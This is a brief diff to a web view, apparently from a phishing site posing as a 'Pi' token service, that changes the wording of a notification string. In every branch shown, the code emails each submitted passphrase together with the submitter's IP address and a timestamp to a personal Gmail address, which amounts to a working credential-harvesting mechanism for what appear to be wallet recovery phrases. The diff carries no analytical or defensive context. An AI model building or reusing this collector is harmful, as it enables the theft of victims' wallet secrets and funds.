@@ -140,7 +140,7 @@ def submit_pass(request):
 
                 else:
                     if testing:
-                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
+                        send_notify(payload=f'Testing submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
 
                     else:
                         send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
